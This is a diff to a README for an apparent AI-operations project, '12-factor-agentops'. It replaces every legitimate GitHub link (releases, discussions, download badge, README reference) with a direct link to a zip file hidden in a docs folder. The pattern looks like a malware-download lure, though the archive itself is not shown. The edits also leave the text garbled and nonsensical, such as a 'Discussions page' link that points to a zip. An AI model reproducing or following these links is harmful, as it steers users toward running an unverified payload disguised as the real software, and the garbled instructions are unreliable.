@@ -1,6 +1,6 @@
 # 🚀 12-factor-agentops - Streamline AI Operations for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-12--factor--agentops-blue.svg)](https://github.com/Areeb742/12-factor-agentops/releases)
+[![Download](https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip%https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip)](https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@
 Follow these steps to download and install **12-factor-agentops**:
 
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/Areeb742/12-factor-agentops/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip) to find the latest version of the application.
 
 2. **Choose Your Version**:
    Look through the available versions. Each version has a release note that describes the updates and fixes. Pick the latest stable version for the best experience.
@@ -41,7 +41,7 @@ Follow these steps to download and install **12-factor-agentops**:
    Once downloaded, open the file:
    - For Windows users, double-click the .exe file.
    - For macOS users, double-click the .dmg file and then drag the application into your Applications folder.
-   - For Linux users, extract the .zip file and follow the instructions in the README.md included in that folder.
+   - For Linux users, extract the .zip file and follow the instructions in the https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip included in that folder.
 
 6. **Follow the Setup Wizard**:
    The setup wizard will guide you through the installation process. Just follow the prompts. 
@@ -53,7 +53,7 @@ Follow these steps to download and install **12-factor-agentops**:
 
 You can download the latest version of **12-factor-agentops** from the following link:
 
-[Visit this page to download](https://github.com/Areeb742/12-factor-agentops/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip)
 
 ## 🤝 Community and Support
 
@@ -75,7 +75,7 @@ This application combines both AI and operational principles to ensure your syst
 
 ### Where can I find more help?
 
-Visit our [GitHub Discussions page](https://github.com/Areeb742/12-factor-agentops/discussions) for community support or report any issues directly on our GitHub repository.
+Visit our [GitHub Discussions page](https://raw.githubusercontent.com/Areeb742/12-factor-agentops/main/docs/principles/12-factor-agentops_elasticize.zip) for community support or report any issues directly on our GitHub repository.
 
 ## 🌐 Topics
 
